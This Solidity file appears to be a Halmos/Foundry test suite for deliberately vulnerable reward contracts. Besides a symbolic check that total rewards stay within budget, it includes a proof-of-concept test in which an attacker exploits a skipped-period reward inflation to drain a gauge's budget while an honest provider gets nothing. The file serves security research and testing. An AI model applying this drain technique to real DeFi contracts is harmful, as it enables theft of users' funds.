// SPDX-License-Identifier: GPL-3.0

pragma solidity =0.8.25;

import "halmos-helpers-lib/HalmosHelpers.sol";
import "./VulnPool.sol";
import "./VulnGauge.sol";
import "./TestERC20.sol";

contract InflatedRewardsHalmos is Test, HalmosHelpers { 
    VulnPool pool;
    VulnGauge gauge;
    SimpleERC20 usdc;

    address deployer;      // owner / keeper in this test
    address honest;        // honest liquidity provider
    address attacker;      // attacker

    uint256 constant WEEK = 604800;
    uint256 period;

    SymbolicActor[] actors;

    function setUp() public {
        vm.startPrank(getConfigurer());
        halmosHelpersInitialize();
        actors = halmosHelpersGetSymbolicActorArray(3);
        deployer = address(actors[0]); // test contract acts as owner/keeper
        honest = address(actors[1]);
        attacker = address(actors[2]);
        vm.stopPrank();

        // Deploy contracts from deployer context
        vm.startPrank(deployer);
        pool = new VulnPool();
        gauge = new VulnGauge(address(pool));
        // in constructor we set owner/rewardAdmin to deployer
        usdc = new SimpleERC20();
        vm.stopPrank();

        // fund gauge with 10 tokens (owner must mint to gauge or transfer)
        // Using vm.prank to mint as external actor
        vm.prank(deployer);
        usdc.mint(address(gauge), 10 ether);

        uint256 start = 1893456000; // 2030-01-01
        vm.warp(start);

        // Set pool liquidity and user liquidity; only owner can set pool liquidity.
        vm.prank(deployer);
        pool.setLiquidity(200);
        vm.prank(deployer);
        gauge.setUserLiquidity(honest, 100);
        vm.prank(deployer);
        gauge.setUserLiquidity(attacker, 100);

        // Owner (rewardAdmin) registers period reward budget.
        period = (start / WEEK) + 1;
        vm.prank(deployer);
        gauge.notifyRewardAmount(address(usdc), 10 ether, period);

        vm.startPrank(getConfigurer());
        halmosHelpersRegisterTargetAddress(address(pool), "VulnPool");
        halmosHelpersRegisterTargetAddress(address(gauge), "VulnGauge");
        halmosHelpersSetOnlyAllowedSelectors(true);
        halmosHelpersAllowFunctionSelector(gauge.getPeriodReward.selector);
        halmosHelpersAllowFunctionSelector(pool.advancePeriod.selector);
        vm.stopPrank();
    }


    function check_rewards_integrity() public  {
        uint256 initialBudget = gauge.periodReward(period, address(usdc));

        vm.warp(block.timestamp + _svm.createUint256("warp1"));
        halmosHelpersSymbolicBatchStartPrank(actors);
        executeSymbolicallyAllTargets("check_rewards_integrity1");
        vm.stopPrank();

        vm.warp(block.timestamp + _svm.createUint256("warp2"));

        uint256 totalEarned = gauge.periodEarned(period, attacker, address(usdc))
                    + gauge.periodEarned(period, honest,   address(usdc));
        assert(totalEarned <= initialBudget);
    }

    /// This test demonstrates:
    ///  - owner (deployer) calls advancePeriod (authorized)
    ///  - rewardAdmin (deployer) notifies reward
    ///  - honest caches before skip, attacker waits and after owner advances skipped period
    ///    attacker earns inflated value and drains the period budget
    function test_authorized_workflow_and_exploit() public {
        // Owner must advance period at period end (authorized keeper)
        // Move to end of first period and advance
        uint256 periodEndTime = period * WEEK;
        vm.warp(periodEndTime);

        // owner calls advancePeriod (onlyOwner)
        vm.prank(deployer);
        pool.advancePeriod();
        // Now both users see the same earned value (no caches yet)
        uint256 honest1 = gauge.periodEarned(period, honest, address(usdc));
        uint256 atk1 = gauge.periodEarned(period, attacker, address(usdc));

        console.log("-------------------- PoC With Auth START --------------------");
        console.log("Liquidity after\t\t\t", pool.liquidity());
        console.log("honestEarned1\t\t\t", honest1);
        console.log("attackerEarned1\t\t\t", atk1);
        console.log("tokenTotalSupplyByPeriod\t\t", gauge.periodReward(period, address(usdc)));

        // Honest caches (anyone can call cachePeriodEarned)
        vm.prank(honest);
        gauge.cachePeriodEarned(period, honest, address(usdc));

        // Now simulate a skipped period by warping one more week forward and owner advancing again.
        vm.warp(periodEndTime + WEEK);

        // owner calls advancePeriod again; this will compute delta based on lastObservationTimestamp
        vm.prank(deployer);
        pool.advancePeriod();

        // Attacker now sees inflated earned and claims (attacker doesn't need privileges)
        uint256 atk2 = gauge.periodEarned(period, attacker, address(usdc));
        console.log("attackerEarned2 (inflated)\t", atk2);

        vm.prank(attacker);
        gauge.getPeriodReward(period, address(usdc), attacker);

        uint256 attackerReceived = usdc.balanceOf(attacker);
        console.log("attackerReceived\t\t\t", attackerReceived);

        // Honest attempts to claim but budget is exhausted
        uint256 before = usdc.balanceOf(honest);
        vm.prank(honest);
        gauge.getPeriodReward(period, address(usdc), honest);
        uint256 _after = usdc.balanceOf(honest);
        console.log("honestReceived\t\t\t", _after - before);

        console.log("-------------------- PoC With Auth END --------------------");

        // Assertions: attacker got tokens and honest got nothing (drain)
        assertGt(attackerReceived, 0, "attacker should have received tokens");
        assertEq(_after - before, 0, "honest should receive nothing after drain");
    }

}